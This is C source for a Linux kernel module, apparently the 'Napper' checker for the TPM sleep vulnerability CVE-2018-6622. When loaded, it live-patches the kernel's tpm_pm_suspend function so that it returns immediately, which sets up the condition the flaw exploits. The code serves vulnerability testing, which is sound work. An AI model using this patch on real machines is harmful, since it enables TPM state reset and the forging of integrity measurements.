/**
 *                           Napper 
 *                        ------------
 *      TPM vulnerability checking tool for CVE-2018-6622 
 *
 *              Copyright (C) 2019 Seunghun Han
 *    at National Security Research Institute of South Korea
 *   Project link: https://github.com/kkamagui/napper-for-tpm
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/text-patching.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Seunghun Han"); 
MODULE_VERSION("1.0"); 
MODULE_DESCRIPTION("Napper kernel module for checking a TPM vulnerability"); 

typedef void *(*TEXT_POKE) (void *addr, const void *opcode, size_t len);

TEXT_POKE g_fn_text_poke;
// XOR RAX, RAX; RET
unsigned char g_ret_op_code[] = {0x48, 0x31, 0xc0, 0xc3};
unsigned char g_org_op_code[sizeof(g_ret_op_code)];
unsigned long g_tpm_suspend_addr;

/**
 * Show banner.
 */
void print_banner(void)
{
	printk(KERN_INFO "napper:  /zz   /zz\n");
	printk(KERN_INFO "napper: | zzz | zz\n");
	printk(KERN_INFO "napper: | zzzz| zz  /zzzzzz   /zzzzzz   /zzzzzz   /zzzzzz   /zzzzzz \n");
	printk(KERN_INFO "napper: | zz zz zz |____  zz /zz__  zz /zz__  zz /zz__  zz /zz__  zz\n");
	printk(KERN_INFO "napper: | zz  zzzz  /zzzzzzz| zz  \\ zz| zz  \\ zz| zzzzzzzz| zz  \\__/\n");
	printk(KERN_INFO "napper: | zz\\  zzz /zz__  zz| zz  | zz| zz  | zz| zz_____/| zz\n");
	printk(KERN_INFO "napper: | zz \\  zz|  zzzzzzz| zzzzzzz/| zzzzzzz/|  zzzzzzz| zz\n");
	printk(KERN_INFO "napper: |__/  \\__/ \\_______/| zz____/ | zz____/  \\_______/|__/\n");
	printk(KERN_INFO "napper:                     | zz      | zz\n");
	printk(KERN_INFO "napper:                     | zz      | zz\n");
	printk(KERN_INFO "napper:                     |__/      |__/\n");
	printk(KERN_INFO "napper: \n");
	printk(KERN_INFO "napper:      v1.1 for checking a TPM vulnerability, CVE-2018-6622\n");
	printk(KERN_INFO "napper:        Made by Seunghun Han, https://kkamagui.github.io\n");
	printk(KERN_INFO "napper:    Project link: https://github.com/kkamagui/napper-for-tpm\n");
	printk(KERN_INFO "napper: \n");
}


/**
 * Initialize this module.
 */
static int __init napper_init(void) 
{
	// Find functions
	g_fn_text_poke = (TEXT_POKE) kallsyms_lookup_name("text_poke");
	g_tpm_suspend_addr = kallsyms_lookup_name("tpm_pm_suspend");

	print_banner();

	printk(KERN_INFO "napper: tpm_pm_suspend address is %lX\n", g_tpm_suspend_addr);
	printk(KERN_INFO "napper: original code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "napper: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);
	printk(KERN_INFO "napper: \n");

	// Backup first byte of tpm_suspend_addr function and patch it to xor and ret.
	memcpy(g_org_op_code, (unsigned char*) g_tpm_suspend_addr, sizeof(g_org_op_code));
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_ret_op_code, sizeof(g_ret_op_code));

	printk(KERN_INFO "napper: patched code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "napper: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);

	printk(KERN_INFO "napper: ready to sleep!\n");
	return 0; 
} 

/**
 * Terminate this module.
 */
static void __exit napper_exit(void) 
{ 
	printk(KERN_INFO "napper: recover code of tpm_pm_suspend\n");
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_org_op_code, sizeof(g_org_op_code));
} 

module_init(napper_init); 
module_exit(napper_exit);
